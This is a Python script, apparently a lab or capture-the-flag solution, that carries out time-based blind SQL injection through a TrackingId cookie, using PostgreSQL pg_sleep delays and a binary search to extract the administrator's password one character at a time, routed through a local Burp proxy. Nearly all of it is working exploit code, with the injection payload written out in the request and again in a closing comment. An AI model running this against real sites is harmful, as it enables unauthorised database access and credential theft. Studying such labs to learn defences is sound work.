"""
This script performs blind SQL injection with time delays and information retrieval. It takes a base URL as an argument and iterates through the characters in the password. It builds up the password by checking if the character is greater than the current character in the ASCII table. If the response time is greater than 0.5 seconds, it means that the character is greater than the current character, and the minimum character is updated. If the response time is less than or equal to 0.5 seconds, it means that the character is less than or equal to the current character, and the maximum character is updated. The script continues to iterate through the characters until it has built up the entire password. 
"""
#!/usr/bin/env/[python3]
# -*- coding: utf-8 -*-

import requests
import sys
import time

"""Blind SQL injection with time delays and information retrieval"""



def get_char(base_url:str, i:int, character:int) -> bool:
    response = requests.get(
        base_url,
        cookies={"TrackingId": f"1'||(SELECT CASE WHEN (SUBSTRING(password, {i}, 1) > '{chr(character)}') THEN pg_sleep(0.5) ELSE 'NULL' END FROM users WHERE username = 'administrator')||'"},#this is the cookie which is being sent to the server, the tracking id is being set to 1 and then the sql statement is being injected. time delay set to 0.5 seconds
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, #this is a dict object, used for Burp
        verify=False,
        )
    return response.elapsed.total_seconds() > 0.5 #this is the time delay, if the response is greater than 0.5 seconds then it will return true, if not it will return false

def main() -> None: 
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>") #this is the usage statement if the user does not enter the correct number of arguments
        exit(1)
    requests.packages.urllib3.disable_warnings()
    password = "" #this is the password which will be built up
    for i in range(1,100): #this is the loop which will iterate through the characters in the password
        min_char = 32 #this is the min character in the ascii table. 
        max_char = 127 #this is the max character in the ascii table, so the max char of what the password could be
        while min_char != max_char: #when min char= max char then we have found the character
            
            char = (min_char + max_char) // 2 #this is the middle of the range of characters, ie looking for the middle of the ascii table (127) eg for a to z looking for m
            result= get_char(sys.argv[1].rstrip("/"),i,char) #this is the base url, the rstrip removes the / from the end of the url if it is there, also i and char are called here
            
            if result: #if the result is true then the char is greater than the char we are looking for
                min_char = char+1 #so the min char is now the char we are looking for, as the min needs to go up to the char we are looking for
            else:
                max_char = char #if the result is false then the max char is now the char we are looking for, as the max needs to go down to the char we are looking for
        result= get_char(sys.argv[1].rstrip("/"),i,char-1)# this checks if the value is true by checking is its greater than the previous one, when min char = max char
        if result:
            password =password+chr(min_char) #this is the password which will be built up, we are convertng it as 41 is ASCII is A, we're adding on the letter to the password
        else:
            print(password)
            return
if __name__ == "__main__":
    main()

# 1'||(SELECT CASE WHEN (SUBSTRING(password, 1, 1) < 'z') THEN pg_sleep(5) ELSE 'NULL' END FROM users WHERE username = 'administrator')||'